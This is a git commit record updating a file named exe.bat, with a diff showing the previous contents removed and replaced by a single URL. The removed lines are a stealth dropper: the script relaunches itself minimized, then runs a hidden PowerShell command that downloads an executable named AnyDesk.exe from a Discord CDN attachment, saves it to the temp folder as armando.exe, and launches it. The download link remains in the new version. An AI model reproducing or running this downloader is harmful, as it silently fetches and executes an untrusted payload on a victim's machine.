921cf402065ba4153fbcdbde2adee86d679100c4
LilGorrillo <peruanoblindado@gmail.com>
2025-02-02 00:12:20 -0600

    Update exe.bat

--- exe.bat
+++ exe.bat
@@ -1,5 +1,1 @@
-@echo off
-if "%1" == "hidden" goto :run
-start /min cmd /c "%~f0" hidden & exit
-:run
-powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1328831724762697879/1335488745780023367/AnyDesk.exe?ex=67a05a51&is=679f08d1&hm=61f1be0ea841bd713791f6a0a4968120b7cf823e4093ddaf46a943d0747b2596&' -OutFile \"%TEMP%\armando.exe\"; Start-Process \"%TEMP%\armando.exe\""
+https://cdn.discordapp.com/attachments/1328831724762697879/1335488745780023367/AnyDesk.exe?ex=67a05a51&is=679f08d1&hm=61f1be0ea841bd713791f6a0a4968120b7cf823e4093ddaf46a943d0747b2596&
